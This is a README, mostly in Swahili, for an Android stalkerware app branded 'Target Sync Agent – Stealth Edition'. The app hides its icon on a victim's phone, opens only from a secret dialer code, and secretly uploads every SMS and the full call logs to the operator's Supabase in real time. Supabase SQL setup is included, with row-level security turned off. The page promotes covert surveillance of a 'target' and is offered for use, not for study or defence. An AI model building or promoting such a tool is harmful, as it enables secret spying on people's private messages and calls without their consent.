# 🔴 TARGET SYNC AGENT – STEALTH EDITION 🔴

<div align="center">

<img src="/file_00000000339c71fd897e55b6a45eb0b2.png" 
     alt="MR-AUTHOR" 
     width="160" 
     style="border: 4px solid #ff0033; border-radius: 12px; 
            box-shadow: 0 0 20px #ff0033, 0 0 45px #ff3366; 
            image-rendering: crisp-edges;">

</div>

<pre style="color: #ff2222; font-size: 12.5px; line-height: 1.05; text-align: center; margin: 15px 0;">
███╗   ███╗██████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ██████╗   
████╗ ████║██╔══██╗   ██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗  
██╔████╔██║██████╔╝   ███████║██║   ██║   ██║   ███████║██║   ██║██████╔╝  
██║╚██╔╝██║██╔══██╗   ██╔══██║██║   ██║   ██║   ██╔══██║██║   ██║██╔══██╗  
██║ ╚═╝ ██║██║  ██║   ██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝██║  ██║  
╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝  
</pre>

<div align="center">
  $${\color{#ff0033}\textbf{"Silence is the best weapon. Your data, my command."}}$$
  
  — $${\color{#ff3366}MR-AUTHOR}$$
</div>

<div align="center">
  ⚡ OWNER: 
  <span style="background:#000000; padding:8px 20px; border:2px solid #ff0033; 
               color:#ff3366; font-weight:bold; border-radius:4px;">
    $${\color{#ff0033}MR-AUTHOR}$$
  </span> 
  ⚡
</div>

---

### 🔥 KAZI YA PROGRAMU – STEALTH MODE

Programu inafanya kazi **bila icon yoyote** kwenye simu ya target (full stealth).  
Inazinduliwa kwa siri kwa kupiga **`*#12345#`** kwenye dialer.

Inakusanya na kupeleka data moja kwa moja kwenye **Supabase** yako kwa wakati halisi:

- ✅ **SMS zote** — mtumaji, ujumbe kamili, timestamp  
- ✅ **Call Logs kamili** — namba, aina (incoming/outgoing/missed), muda, duration  

Unaweza kuziona na kuzidownload kupitia dashboard yako yenye login/signup.

---

### 🧠 MANTIKI YA UFANYAKAZI

| Kipengele              | Maelezo |
|------------------------|--------|
| **Stealth Mode**       | Haina icon. Inazinduliwa kwa *#12345# kwenye dialer. |
| **Ruhusa**             | Inaomba SMS & Call Logs permissions mara moja tu. |
| **Initial Sync**       | Inasoma data yote iliyopo na kupeleka Supabase mara inapoanza. |
| **Auto-Sync**          | Kila baada ya dakika 15 au unapobonyeza SYNC button. |
| **Offline Handling**   | Inahifadhi data na kuisync moja kwa moja mtandao unaporudi. |
| **Realtime Events**    | Inasikiliza SMS mpya au simu na kusync mara moja. |

---

### 🗃️ SUPABASE SETUP (LAZIMA KABLA YA BUILD APK)

Tengeneza meza hizi kwenye Supabase yako **kabla** ya kujenga APK:

```sql
-- Jedwali la SMS
CREATE TABLE sms (
  id SERIAL PRIMARY KEY,
  sender TEXT,
  body TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Jedwali la Call Logs
CREATE TABLE call_logs (
  id SERIAL PRIMARY KEY,
  number TEXT,
  type TEXT CHECK (type IN ('incoming', 'outgoing', 'missed')),
  duration INT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Zima RLS kwa majaribio (baadaye weka security)
ALTER TABLE sms DISABLE ROW LEVEL SECURITY;
ALTER TABLE call_logs DISABLE ROW LEVEL SECURITY;
